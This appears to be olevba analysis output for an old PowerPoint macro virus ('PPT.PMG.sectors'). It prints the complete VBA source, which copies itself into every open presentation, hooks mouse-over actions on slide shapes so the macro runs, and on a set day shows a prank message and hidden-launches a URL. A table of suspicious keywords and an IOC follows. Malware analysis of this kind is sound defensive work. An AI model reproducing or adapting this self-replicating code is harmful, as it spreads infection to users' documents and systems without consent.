olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSPPoint.PMG
Type: Text
-------------------------------------------------------------------------------
VBA MACRO ./Virus.MSPPoint.PMG 
in file: ./Virus.MSPPoint.PMG - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'------------------------------------------------------------
'Powerpoint.Macro.virus.sectors
'by sector-s team
'http://sectors.vze.com
'Jalan mulus di Powerpoint Office 97
'21.11.2000
'--------------Do not edit above this line!------------------
Sub PMG(sectors)
On Error Resume Next
Set Mysectors = ActivePresentation.VBProject.VBComponents("sectors").CodeModule
Thissectors = Mysectors.CountOfLines + 1: sectorsFiles = Mysectors.Lines(1, Thissectors)
For Each Thissectors In Presentations
If Thissectors.VBProject.VBComponents(Mysectors).Name <> Mysectors Then
Thissectors.VBProject.VBComponents.Add(1).Name = Mysectors
Thissectors.VBProject.VBComponents(Mysectors).CodeModule.InsertLines 1, sectorsFiles
For Each Littlesectors In Thissectors.Slides(Thissectors.Slides.Count).Shapes
If Littlesectors.ActionSettings(ppMouseOver).Action = 0 Then _
Littlesectors.ActionSettings(ppMouseOver).Action = ppActionRunMacro: _
Littlesectors.ActionSettings(ppMouseOver).Run ="PMG"
Next: End If: Next
On Error GoTo Exit_Payload
If Day(Now()) = 10 then
Application.Caption = "Microfuck Powerpoint Lame"
Msgbox "Hellooo....!!! Microsoft is Lame", 0, "PPT.PMG.sectors"
Shell "start http://sectors.vze.com", vbHide
End If
Exit_Payload:
End Sub

by superbejo (who I'm..??)

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |http://sectors.vze.c|URL                                          |
|          |om                  |                                             |
+----------+--------------------+---------------------------------------------+

